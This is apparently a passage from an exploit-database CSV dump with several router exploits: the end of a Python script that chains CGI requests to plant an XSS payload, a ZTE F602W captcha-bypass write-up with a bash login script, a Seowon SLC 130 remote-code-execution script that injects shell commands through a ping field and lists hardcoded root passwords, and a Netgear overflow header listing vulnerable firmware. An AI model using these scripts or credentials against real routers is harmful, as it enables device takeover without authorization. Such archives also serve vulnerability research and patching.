headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/pppoe.cgi?enblEnetWan=0&ntwkPrtcl=0&enVlanMux=1&vlanMuxId=-1&vlanMuxPr=-1&serviceName=pppoe_0_8_35&sessionKey="" + self.referer_sessionkey}
response = self.session.get(""http://"" + str(self.ip) + ""/ifcgateway.cgi"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def step6(self):
print()
print(""[*] Performing step 6/8..."")
paramsGet = {""sessionKey"": self.current_sessionkey, ""defaultGatewayList"": ""ppp0.1""}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/ifcgateway.cgi?pppUserName=&pppPassword=&enblOnDemand=0&pppTimeOut=0&useStaticIpAddress=0&pppLocalIpAddress=0.0.0.0&pppIpExtension=0&enblNat=0&enblFirewall=0&enblFullcone=0&pppAuthMethod=0&pppServerName=&pppAuthErrorRetry=0&enblPppDebug=0&pppToBridge=0&enblIgmp=0&sessionKey="" + self.referer_sessionkey}
response = self.session.get(""http://"" + str(self.ip) + ""/ifcdns.cgi"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def step7(self):
print()
print(""[*] Performing step 7/8..."")
paramsGet = {""dnsRefresh"": ""1"", ""sessionKey"": self.current_sessionkey, ""dnsPrimary"": ""1.1.1.1"", ""dnsSecondary"": ""8.8.8.8""}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/ifcdns.cgi?defaultGatewayList=ppp0.1&sessionKey="" + self.referer_sessionkey}
response = self.session.get(""http://"" + str(self.ip) + ""/ntwksum2.cgi"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
self.referer_sessionkey = self.current_sessionkey
self.current_sessionkey = self.get_sessionKey(response.content)
sleep(1)
def final_step8(self):
print()
print(""[*] Performing final step 8/8. Deploying XSS payload..."")
paramsGet = {""sessionKey"": self.current_sessionkey, ""action"": ""add""}
headers = {""User-Agent"": self.user_agent, ""Referer"": ""http://"" + str(self.ip) + ""/ntwksum2.cgi?dnsPrimary=1.1.1.1&dnsSecondary=8.8.8.8&dnsRefresh=1&sessionKey="" + self.referer_sessionkey}
self.session.get(""http://"" + str(self.ip) + ""/wancfg.cmd"", params=paramsGet, headers=headers, auth=HTTPBasicAuth(self.username, self.password))
print()
print(""[+] XSS payload deployed successfully"")
print(""[+] Happy hacking :) . Author: OscarAkaElvis"")
@staticmethod
def main(self, arguments):
self.check_params(arguments)
self.check_router()
self.check_login()
self.step1()
self.step2()
self.step3()
self.step4()
self.step5()
self.step6()
self.step7()
self.final_step8()
exit(0)
if __name__ == '__main__':
ImportObject = Exploit()
ImportObject.main(ImportObject, argv[1:])"
2020-09-10,WebApps,Hardware,Hritik Vijay,ZTE Router F602W,Captcha Bypass,"# Exploit Title: ZTE Router F602W - Captcha Bypass
# Exploit Author: Hritik Vijay (@MrHritik)
# Vendor Homepage: https://zte.com.cn
# Reported: 2019-06-14
# Version: F6x2W V6.0.10P2T2
# Version: F6x2W V6.0.10P2T5
# Tested on: F602W
# CVE: CVE-2020-6862
#!/bin/bash","Background
Captcha is used to make sure the form is being filled by a real person
than an automated script. This is a very popular safety measure and
bypassing it could lead to potential compromise.
Introduction
While logging in to the affected device you are presented with a
username, password and captcha field. Submitting the form results in an
HTTP request being sent out to /checkValidateCode.gch to validate the
captcha, if valid it goes on to really submit the login request. This
can be easily bypassed as this is a client side verification. One can
always ignore the response and proceed to forcefully submit the form via
Javascript (via calling the subpageSubmit() method).
A typical login request looks like this:
POST / HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.1/
Content-Type: application/x-www-form-urlencoded
Content-Length: 101
Connection: close
Cookie: _TESTCOOKIESUPPORT=1
Upgrade-Insecure-Requests: 1
frashnum=&action=login&Frm_Logintoken=2&Username=admin&Password=admin&Validatecode=literally_anything
Though, firing the same request twice fails with a text on the top
saying ""Error"". This pretty much defeats our purpose. It turns out that
on every login attempt, the parameter Frm_Logintoken gets incremented by
one and is required to match the server side value. This can pretty
easily be achieved by some pattern matching. Thus allowing any script
to bypass the captcha and log in.
Threat
A captcha bypass can really help in bruteforcing the credentials but
luckily the router limits the login trials to 3 attempts. In real
world though, things are a bit different.
The affected ZTE router comes with a default password. Given that the
devices on a same ISP network can access each other, it would be a
matter of time before someone writes a script to log in to every router
in the network and take control of it.
PoC
SERVER=192.168.1.1
USER=""admin""
PASS=""admin""
getToken(){
curl -s  --cookie ' _TESTCOOKIESUPPORT=1; PATH=/;' $SERVER | grep 'Frm_Logintoken"")' | cut -d\"" -f4
Frm_Logintoken=`getToken`
s=$(curl -sv --data ""frashnum=&action=login&Frm_Logintoken=$Frm_Logintoken&Username=$USER&Password=$PASS"" --cookie ' _TESTCOOKIESUPPORT=1; PATH=/;' $SERVER -w ""%{http_code}"" -o /dev/null 2> /tmp/zte_cookie)
if [[ $s -eq 302 ]]; then
echo ""Logged in""
echo ""Open http://$SERVER/start.ghtml""
echo `grep -o Set-Cookie.* /tmp/zte_cookie`
else
echo ""Failed""
fi"
2020-08-21,WebApps,Hardware,maj0rmil4d,Seowon SlC 130 Router,Remote Code Execution,"# Exploit Title: Seowon SlC 130 Router - Remote Code Execution
# Author: maj0rmil4d - Ali Jalalat
# Author website: https://secureguy.ir
# Date: 2020-08-20
# Vendor Homepage: seowonintech.co.kr
# Software Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=150&big_kind=B05&middle_kind=B05_29
# CVE: CVE-2020-17456
# Version: Lync:Mac firmware 1.0.1, likely earlier versions
# Tested on: Windows 10 - Parrot sec
# Description:
# user can run arbitrary commands on the router as root !
# as there are already some hardcoded credentials so there is an easy to trigger exploit
# credentials :
# user => VIP
# pwd => V!P83869000
# user => Root
# pwd => PWDd0N~WH*4G#DN
# user => root
# pwd => gksrmf28
# user => admin
# pwd => admin
# A  write-up can be found at:
# https://maj0rmil4d.github.io/Seowon-SlC-130-And-SLR-120S-Exploit/
#auth
#rce","import requests
import sys
host = sys.argv[1]
session = requests.Session()
header = {
""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"",
""Accept"": ""text/html,application/xhtml+xml,application/xml;q:0.9,image/webp,*/*;q:0.8"",
""Accept-Language"": ""en-US,en;q:0.5"",
""Accept-Encoding"": ""gzip, deflate"",
""Content-Type"": ""pplication/x-www-form-urlencoded"",
""Content-Length"": ""132"",
""Origin"": ""http://192.168.1.1"",
""Connection"": ""close"",
""Referer"": ""http://192.168.1.1/"",
""Upgrade-Insecure-Requests"": ""1""
datas = {
""Command"":""Submit"",
""expires"":""Wed%2C+12+Aug+2020+15%3A20%3A05+GMT"",
""browserTime"":""081119502020"",
""currentTime"":""1597159205"",
""user"":""admin"",
""password"":""admin""
session.post(host+""/cgi-bin/login.cgi"" , headers=header , data = datas)
cmd = sys.argv[2]
rce_data = {
""Command"":""Diagnostic"",
""traceMode"":""ping"",
""reportIpOnly"":"""",
""pingIpAddr"":"";"".encode(""ISO-8859-1"").decode()+cmd,
""pingPktSize"":""56"",
""pingTimeout"":""30"",
""pingCount"":""4"",
""maxTTLCnt"":""30"",
""queriesCnt"":""3"",
""reportIpOnlyCheckbox"":""on"",
""btnApply"":""Apply"",
""T"":""1597160664082""
rce = session.post(host+""/cgi-bin/system_log.cgi"" , headers=header , data = rce_data)
print(""one line out put of ur command => "" + rce.text.split('!')[1].split('[')[2].split(""\n"")[0])"
2020-06-15,WebApps,Hardware,grimm-co,Netgear R7000 Router,Remote Code Execution,"# EDB Note: Download ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/48588.zip
# Exploits a pre-authentication memcpy based stack buffer overflow vulnerability
# in httpd on several devices and versions:
#   Device      Version               httpd md5sum                      Exploit status
#   AC1450      V1.0.0.36_10.0.17     c105a629d55d3f7b29d6b88e2cc6ff3a  Untested
#   AC1450      V1.0.0.34_10.0.16     b01fa2155dbe3d37c0d244f2a258b797  Untested
#   AC1450      V1.0.0.22_1.0.10      8327b4ccf3c3ea1281f5beb932f308bb  Untested
#   AC1450      V1.0.0.14_1.0.6       a199bd85a19fbfe360e967c889fb0a83  Untested
#   AC1450      V1.0.0.8_1.0.4        c1f64b91722efa50452d6842a5e97f77  Untested
#   AC1450      V1.0.0.6_1.0.3        1b043477b16d5bbd2be3d4b7c4430953  Untested
#   D6220       V1.0.0.52_1.0.52      4c63e0a531ddf60310faf99702226c37  Untested
#   D6220       V1.0.0.48_1.0.48      2efa4dfdb0901ffe4b99555e2ddeca32  Untested
#   D6220       V1.0.0.46_1.0.46      2911f178060efcda3644be4bc7f25249  Untested
#   D6220       V1.0.0.44_1.0.44      3ea0dbb8e22d0e4daf3f12d5bb26ab64  Untested
#   D6220       V1.0.0.40_1.0.40      ef47f7085976c65890991eb67bbd31f7  Untested
#   D6220       V1.0.0.36_1.0.36      06c1b6ff9bac3e5c583f71f8cb63bd3a  Untested
#   D6220       V1.0.0.34_1.0.34      9a1fcd70a952b63ea874a826793e11ba  Untested
#   D6220       V1.0.0.32_1.0.32      5f9b38b2e4afcff3117f3f4d1bc454f4  Untested
#   D6220       V1.1.0.28_1.0.28      5fa7890b766cbd6233043a601bdc990c  Untested
#   D6220       V1.0.0.24_1.0.24      1d8cfa4843dd9c4f1b1360beca080a81  Untested
#   D6220       V1.0.0.22_1.0.22      3d1916d41b6e1e728238e5def8723b3e  Untested
#   D6220       V1.0.0.16_1.0.16      d5d19a4e7ba57850e4c09a01766cde3a  Untested
#   D6300       V1.0.0.102_1.0.102    8dd49d875e2683e396dc67381fadd057  Tested
#   D6300       V1.0.0.96_1.1.96      5caa6056af76330fc0292657f192cb69  Untested
#   D6300       V1.0.0.90_1.0.90      6196e4b48c9337fd5b89f527262f81dc  Tested
#   D6300       V1.0.0.88-1.0.88      d65d7d6db8a240bed2c845f9ce5ef8ed  Untested
#   D6300       V1.0.0.76_1.0.76      b4c98cc8ff8d9cd3c4a1f65c5c5f0fde  Untested
#   D6300       V1.0.0.72_1.0.72      d0690f900a0fa29b38266b04de51869e  Untested
#   D6300       V1.0.0.42_1.0.42      e86b7593f1e6d59f49fe4948379d0d69  Untested
#   D6300       V1.0.0.30_1.0.30      f3691a3179fcd7390b62398f365a4c1a  Untested
#   D6300       V1.0.0.24_1.0.24      33cad70c5c307950fffded6c8f64066b  Untested
#   D6300       V1.0.0.16_1.0.16      55f4d6ac42eff8014254eadce033faac  Untested
#   D6400       V1.0.0.88_1.0.88      a9a31bd500dc6542969e039283b4f44f  Untested
#   D6400       V1.0.0.86_1.0.86      6ef83c99c829dc7e7d0a0907d3ed71a8  Untested
#   D6400       V1.0.0.82_1.0.82      33c63fc65ecba162e8acbb85bed0dda0  Untested
#   D6400       V1.0.0.80_1.0.80      4d9a3533b6e7afddfb2060649e44d092  Untested
#   D6400       V1.0.0.78_1.0.78      6de4a742f7c7edd7241deda0fdfd5ab4  Untested
#   D6400       V1.0.0.74_1.0.74      e692a2670b133efb293ecc3e3f9c82b4  Untested
#   D6400       V1.0.0.70_1.0.70      a9a0cd9ebb6e45671b03a291f79cfaf0  Untested
#   D6400       V1.0.0.68_1.0.68      226c662ecbf01f524cf0c0537220d652  Untested
#   D6400       V1.0.0.66_1.0.66      a1986e8fe5c270d2e8a3f9416b086a85  Untested
#   D6400       V1.0.0.60_1.0.60      1f74db16784172b4e8b385149b7b730c  Untested
#   D6400       V1.0.0.58_1.0.58      e62704fc3cec8611afc65643564943d2  Untested
#   D6400       V1.0.0.56_1.0.56      b02401e956d4160c59a2f59a31da51bc  Untested
#   D6400       V1.0.0.54_1.0.54      632e9d26af86341f2eea25248e298b8c  Untested
#   D6400       V1.0.0.52_1.0.52      c54e25d1dcd814c44ee29b26337ca140  Untested
#   D6400       V1.0.0.44_1.0.44      9b5cca485ed56ade5cb3d556c8bb975b  Untested
#   D6400       V1.0.0.38_1.1.38      b5729e40e61563f7a1a29359e0f9c78c  Untested
#   D6400       V1.0.0.34_1.3.34      5628ae2ce9326a63b050e96b6aa3fb79  Untested
#   D6400       V1.0.0.22_1.0.22      1dc99a4d0952f648f1dab07d5cdd2a60  Untested
#   D7000v2     V1.0.0.56_1.0.1       a35f742d1d7ebf7c882fa71bc6cd4d74  Untested
#   D7000v2     V1.0.0.53_1.0.2       27d115ede639511d2eda25114dd82a5b  Untested
#   D7000v2     V1.0.0.52_1.0.1       827190546bcae129c56334674af3f669  Untested
#   D7000v2     V1.0.0.51_1.0.1       0583d3f1fd97d3616a9e1448be12ee16  Untested
#   D7000v2     V1.0.0.47_1.0.1       4880a731183fce2b4d47c5064c6d7236  Untested
#   D7000v2     V1.0.0.45_1.0.1       2f1bc9a39d033d10c9ae73c299353524  Untested
#   D7000v2     V1.0.0.44_1.0.1       7d37548ceda1aeb2a163b9616ecfc156  Untested
#   D7000v2     V1.0.0.40_1.0.1       095c32dae5741f5342f5b5aaeeac6206  Untested
#   D7000v2     V1.0.0.38_1.0.1       acca219a67790af0897f8ca6f1bd949f  Untested
#   D8500       V1.0.3.44_1.0.1       24352845696378cb0bcef38414d5640a  Untested
#   D8500       V1.0.3.43_1.0.1       b71e3b8eb1aedd615aafc9311dd36886  Untested
#   D8500       V1.0.3.42_1.0.1       a567caf426cc76cd11ec3c3053519c8f  Untested
#   D8500       V1.0.3.39_1.0.1       ff56ddb8126f5aa1dfc4d85d2eeafce4  Untested
#   D8500       V1.0.3.36_1.0.1       862a04b37c61fa9cadff8754d9f3abb2  Untested
#   D8500       V1.0.3.35_1.0.1       16d4ab7b3357bda7e68a79b5b9022c4d  Untested
#   D8500       V1.0.3.28_1.0.1       94bbb72e108e68a774746a97cc7c00c0  Untested
#   D8500       V1.0.3.27_1.0.1       822427e336366dd83c018e541d1d2d4f  Untested
#   D8500       V1.0.3.25_1.0.1       ddd3c3f02d1286f26344265d6db1bea5  Untested
#   DC112A      V1.0.0.44_1.0.60      e4721b08c70fcdc3dd1048cee49c2118  Untested
#   DC112A      V1.0.0.30_1.0.60      c11c0fb597c234e682fbbf3f5ba00d90  Untested
#   DC112A      V1.0.0.24_1.0.60      b2b677dff87eab44b4972ff4948532e6  Untested
#   DGN2200     V1.0.0.58_7.0.57      db21e42ca1bf1878192fa7b1627b065a  Tested
#   DGN2200     V1.0.0.57_7.0.57      b5e9360ea0411e3e01e2901ec1c14c61  Untested
#   DGN2200     V1.0.0.55_7.0.55      5853a3a4aa466ad491b23d2a59759f67  Untested
#   DGN2200     V1.0.0.52_7.0.52      8286b50e5598cf314aa15d0ce204e36c  Untested
#   DGN2200     V1.0.0.50_7.0.50NA    6e37ab74491954b2763bdb6214848045  Untested
#   DGN2200     V1.0.0.36_7.0.36NA    3ab21af915088055bcdfc5ade0af2c2c  Untested
#   DGN2200     V1.0.0.36_7.0.36      75a601e25219af4cf8a0c0978a3a1d71  Untested
#   DGN2200v4   V1.0.0.110_1.0.110    5a8772a24aac9d15128bf928d748c1ab  Untested
#   DGN2200v4   V1.0.0.108_1.0.108    2ce2f58da92aba784e0d54e2b6ddfc22  Untested
#   DGN2200v4   V1.0.0.102_1.0.102    c7f92c42a258d6e8eadcb9335f25afdb  Tested
#   DGN2200v4   V1.0.0.98_1.0.98      ce7f84170d80046146076c0212c46b22  Untested
#   DGN2200v4   V1.0.0.90_1.0.90      fad68b99a9fb2eab63cbfc6b56951d82  Untested
#   DGN2200v4   V1.0.0.86_1.0.86      6a81f9a1c610a9884308d58faf36e5a7  Untested
#   DGN2200v4   V1.0.0.82_1.0.82      adfeaa24b82ff7a9ae3ce4a779f32240  Untested
#   DGN2200v4   V1.0.0.76_1.0.76      6ca6a23431ea41ed6fbb2c71dc6d46f8  Untested
#   DGN2200v4   V1.0.0.66_1.0.66      52e293aea6c51a08be9e00aa653217e2  Untested
#   DGN2200v4   V1.0.0.62_1.0.62      e88ebcec9d158dfaf557c996a6034edc  Untested
#   DGN2200v4   V1.0.0.58_1.0.58      a7a3412bc7608971b6a0bf47c95a56d6  Untested
#   DGN2200v4   V1.0.0.46_1.0.46      603daa3cedb8c6269257416c27f1e55b  Untested
#   DGN2200v4   V1.0.0.24_5.0.8       a9151f0c434e6b27135b628a8cf51134  Untested
#   DGN2200v4   V1.0.0.5_5.0.3        4668835a74ecab6333889d7efe171361  Untested
#   DGN2200M    V1.0.0.37_1.0.21WW    87fbe2fa75d8acdee8022f71629d7d79  Tested
#   DGN2200M    V1.0.0.35_1.0.21WW    ffd47e9d882ce4f3de11df49ce7a535b  Tested
#   DGN2200M    V1.0.0.35_1.0.21NA    a8edc9e918fde432f6979af0ea77aeb6  Untested
#   DGN2200M    V1.0.0.33_1.0.21WW    6868b9bd17a5a47c739c0bf68dc04875  Untested
#   DGN2200M    V1.0.0.33_1.0.21NA    d8ddd5aef65509ee95239135aa3dfc71  Untested
#   DGN2200M    V1.0.0.26_1.0.20WW    b2942e856d5690962d7b39d585d63c2d  Untested
#   DGN2200M    V1.0.0.24_1.0.20NA    3cf45d175d4151dadd8d2823b7222121  Untested
#   DGND3700    V1.0.0.17_1.0.17      b103c87de279c008bfd9793fb808125e  Untested
#   DGND3700    V1.0.0.17_1.0.17NA    d88c70428a629ae3a899628e4d0d7f2c  Untested
#   DGND3700    V1.0.0.12_1.0.12      83fabbde0e49ab07a5ab77a94a5dd0d4  Untested
#   DGND3700    V1.0.0.12_1.0.12NA    c6735900e4239a2a474f82fea6b2bf2f  Untested
#   EX3700      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3700      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3700      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3700      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3700      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3700      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3700      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3700      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3700      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3700      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3700      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3700      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3700      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3700      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3700      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX3700      V1.0.0.24_1.0.18      64e7797362fe0b58c4eb71758b8fa5bf  Untested
#   EX3700      V1.0.0.22_1.0.17      ee6f11943d1cd33f87f6fddd01917f96  Untested
#   EX3800      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3800      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3800      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3800      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3800      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3800      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3800      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3800      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3800      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3800      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3800      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3800      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3800      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3800      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3800      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX3920      V1.0.0.78_1.0.51      456b1fdd776007c0999a6b5cc85ea4e0  Untested
#   EX3920      V1.0.0.76_1.0.49      cd4e4e9179569fafa3c406cf48d4ee2c  Untested
#   EX3920      V1.0.0.72_1.0.47      3556b3a666c781dbed7d6d6304ae34b5  Untested
#   EX3920      V1.0.0.70_1.0.46      a0e1573c0e8dbd9ae43ab07e1e4bddd7  Untested
#   EX3920      V1.0.0.68_1.0.45      d26b6062d6e75fee8109e67572cdcc26  Untested
#   EX3920      V1.0.0.64_1.0.43      d665edd51692e539592b5e1667eef22c  Untested
#   EX3920      V1.0.0.62_1.0.42      9e753ac547229b6a3df28f03115a8d31  Untested
#   EX3920      V1.0.0.58_1.0.38      67ab1cac6cbf6d074cea95fadca461ab  Untested
#   EX3920      V1.0.0.50_1.0.30      26bf966c3dc6143f126ccc6d4e016b0b  Untested
#   EX3920      V1.0.0.48_1.0.28      df8012bd7cf20db8592aaacf6b634691  Untested
#   EX3920      V1.0.0.46_1.0.26      e9416497850099b1f851d52bbb5f520c  Untested
#   EX3920      V1.0.0.44_1.0.22      30323764937bae52d93184f3b521783a  Untested
#   EX3920      V1.0.0.34_1.0.22      37c8368144211c8f73d7be9a9f6dacb2  Untested
#   EX3920      V1.0.0.28_1.0.20      d7e6b85d140f09f08ce3129dc88918c2  Untested
#   EX3920      V1.0.0.26_1.0.19      bc0c9df4ed9424c0d3b94bf78db594c0  Untested
#   EX6000      V1.0.0.38_1.0.22      fa48d3a1d76f0141022b70b37a139bfb  Untested
#   EX6000      V1.0.0.32_1.0.18      b119eb091db312c9223291cc12608bc4  Untested
#   EX6000      V1.0.0.30_1.0.17      a4988eb60c3b548c8117ff79a4e0601e  Untested
#   EX6000      V1.0.0.28_1.0.16      dc2b1eb141909690af81ef5690cc5912  Untested
#   EX6000      V1.0.0.24_1.0.14      26077a4cdaf21b6ba0d886ea070ce8d7  Untested
#   EX6000      V1.0.0.20_1.0.11      f17de59371f715b6735f0f7f8c9042e9  Untested
#   EX6000      V1.0.0.10_1.0.6       e507e02386a634b092be4a5e2118e7b1  Untested
#   EX6100      V1.0.2.24_1.1.134     6fde4f0259baeb6a3680fb9796b920ab  Tested
#   EX6100      V1.0.2.18_1.1.131     5baa9a7007dff6000bf143231e8f43ce  Untested
#   EX6100      V1.0.2.16_1.1.130     ee1efa975138f748fbbb21a450b956a9  Untested
#   EX6100      V1.0.2.6_1.1.120      f5a6e0de947f281261b0078fa306e631  Untested
#   EX6100      V1.0.1.36_1.0.114     a1b3591183bc3f75dc280f0565b2c2c9  Untested
#   EX6100      V1.0.0.28_1.0.66      7a39f661c1c6e7f3168dd9e805283f12  Tested
#   EX6100      V1.0.0.22_1.0.51      0bb3870ff95764b2cd600c673d81af8e  Untested
#   EX6120      V1.0.0.48_1.0.30      e05613c38204f66c1c8003f5ec4bde0d  Untested
#   EX6120      V1.0.0.46_1.0.29      46a4c7f6f054665bed444c2f536b7bf0  Untested
#   EX6120      V1.0.0.42_1.0.27      ddbaa705a3e54cf361735c559e500494  Untested
#   EX6120      V1.0.0.40_1.0.25      9d6ad5117207ffeda165dea3f9bb4f73  Untested
#   EX6120      V1.0.0.36_1.0.23      cfdfa436b024e95d53630fd71f46c48e  Untested
#   EX6120      V1.0.0.32_1.0.21      58866ce4c45337157d573d904e2a4052  Untested
#   EX6120      V1.0.0.30_1.0.20      817c93296f8149f6a8e41ef501918509  Untested
#   EX6120      V1.0.0.28_1.0.18      feb144c0a06e2251647ff8a8bb88704b  Untested
#   EX6120      V1.0.0.26_1.0.16      90c4e8c9ef5c03e09989caf944a80cf3  Untested
#   EX6120      V1.0.0.16_1.0.11      8f388e0ee15e32f9b7ee46d49d8e9ea2  Untested
#   EX6120      V1.0.0.14_1.0.10      b6e59d1ef530c60a9ba03b8b28784cca  Untested
#   EX6120      V1.0.0.8_1.0.4        be69b611410dee663ca081d23e56cc9b  Untested
#   EX6120      V1.0.0.4_1.0.2        368cbc774798fb5233f82cb02277213b  Untested
#   EX6130      V1.0.0.30_1.0.17      947f815e4a2fe0678e7dd67c4b10cc99  Untested
#   EX6130      V1.0.0.28_1.0.16      20db4ec9dfa72f0a3a6e5574b5663cb7  Untested
#   EX6130      V1.0.0.24_1.0.14      355fe4afe7c8c017ed8048f39e3ad1e3  Untested
#   EX6130      V1.0.0.22_1.0.13      6b87f60aa1ea4c6d9d44f2e8f32fc2aa  Untested
#   EX6130      V1.0.0.20_1.0.12      428b183f162edddacb3c4d4da0a2ecd6  Untested
#   EX6130      V1.0.0.16_1.0.10      ede8953a631f5315085bfcbc50ac0534  Untested
#   EX6130      V1.0.0.12_1.0.7       a1485ffd1b0afa2430c8ceb860fd12c8  Untested
#   EX6150      V1.0.0.42_1.0.73      f826bb5b4850ec73c3c5522db0d9f3bb  Untested
#   EX6150      V1.0.0.34_1.0.69      ff4a9ac154f6dc5c58d8ee72c847d6dc  Untested
#   EX6150      V1.0.0.32_1.0.68      baf6e6074326d8da71b5e81d59fd2bbc  Untested
#   EX6150      V1.0.0.28_1.0.64      4209003e1c1c481ad66679918ccefd41  Untested
#   EX6150      V1.0.0.16_1.0.58      56f1fa5cddc9a714796fd671e95d12ce  Untested
#   EX6150      V1.0.0.14_1.0.54      067b3adcde96e80e0bcc11ed9c846459  Untested
#   EX6200      V1.0.3.90_1.1.125     884de197aa849e668ac7810561e92265  Untested
#   EX6200      V1.0.3.88_1.1.123     6c183bb1b9b025cb30496dee0d9ab473  Untested
#   EX6200      V1.0.3.82_1.1.117     91e4f5f7fd02adb693b79572a2f887a0  Untested
#   EX6200      V1.0.3.76_1.1.111     c20025474fb29a28dc45e7b2c4566421  Untested
#   EX6200      V1.0.3.74_1.1.109     c7e0ea632820e9674165190d2f7d8a57  Untested
#   EX6200      V1.0.3.68_1.1.104     4fce79801c0ad403df3d627c0d3cc290  Untested
#   EX6200      V1.0.1.60_1.1.98      49b23634828219d28739195b491749de  Untested
#   EX6200      V1.0.0.52_1.1.90      dc12bb1fb624fd72625f951d829c84be  Untested
#   EX6200      V1.0.0.46_1.1.70      49b158f381a21555d0c715c6e7c33d64  Untested
#   EX6200      V1.0.0.42_1.1.57      4024cd22371a955861589cfdca67014d  Untested
#   EX6200      V1.0.0.38_1.1.52      2e6e9debfe5b93d54e18ec8f04a43480  Untested
#   EX6920      V1.0.0.40_1.0.25      9d6ad5117207ffeda165dea3f9bb4f73  Untested
#   EX6920      V1.0.0.36_1.0.23      cfdfa436b024e95d53630fd71f46c48e  Untested
#   EX6920      V1.0.0.32_1.0.21      58866ce4c45337157d573d904e2a4052  Untested
#   EX6920      V1.0.0.30_1.0.20      817c93296f8149f6a8e41ef501918509  Untested
#   EX6920      V1.0.0.28_1.0.18      feb144c0a06e2251647ff8a8bb88704b  Untested
#   EX6920      V1.0.0.26_1.0.16      90c4e8c9ef5c03e09989caf944a80cf3  Untested
#   EX6920      V1.0.0.16_1.0.11      8f388e0ee15e32f9b7ee46d49d8e9ea2  Untested
#   EX6920      V1.0.0.14_1.0.10      b6e59d1ef530c60a9ba03b8b28784cca  Untested
#   EX6920      V1.0.0.8_1.0.4        be69b611410dee663ca081d23e56cc9b  Untested
#   EX6920      V1.0.0.4_1.0.2        368cbc774798fb5233f82cb02277213b  Untested
#   EX7000      V1.0.1.84_1.0.148     769b68e697516fd40645e85266276844  Untested
#   EX7000      V1.0.1.80_1.0.144     df02a32c3e8dfe22a0e10adf8f9cfa9d  Untested
#   EX7000      V1.0.1.78_1.0.140     cf3939b5cd5f3379084c164f0ab85ea5  Untested
#   EX7000      V1.0.0.66_1.0.126     13ddf3f666fe43a4c988babf54861292  Untested
#   EX7000      V1.0.0.62_1.0.122     ce6c2f13b057873db9fec0f7fdc86b5b  Untested
#   EX7000      V1.0.0.58_1.0.112     0b988da5188b0c2712a8414f34f68152  Untested
#   EX7000      V1.0.0.56_1.0.108     40ce1aadf9810780d9b9d1cc6dd27a29  Untested
#   EX7000      V1.0.0.50_1.0.102     f862e5ae2823f9187580796c90dd388b  Untested
#   EX7000      V1.0.0.42_1.0.94      be8bd31d14825930b8f6f9e4005b436e  Untested
#   EX7000      V1.0.0.38_1.0.91      04c5f1f03a3ed1491519c450e73a30df  Untested
#   EX7000      V1.0.0.36_1.0.88      ed80bd32dc66f080d962295130c7665c  Untested
#   EX7000      V1.0.0.32_1.0.84      00376a5055221c56217a93e41a5ef9c9  Untested
#   EX7000      V1.0.0.30_1.0.72      e182cad2e1d3bfbc33142141958e62f5  Untested
#   LG2200D     V1.0.0.57_1.0.40      c788662b93484b512c97147f5e008ff9  Untested
#   MBM621      V1.1.3                4ac9ddde0b40da6b2f8c9e66d7cb3560  Untested
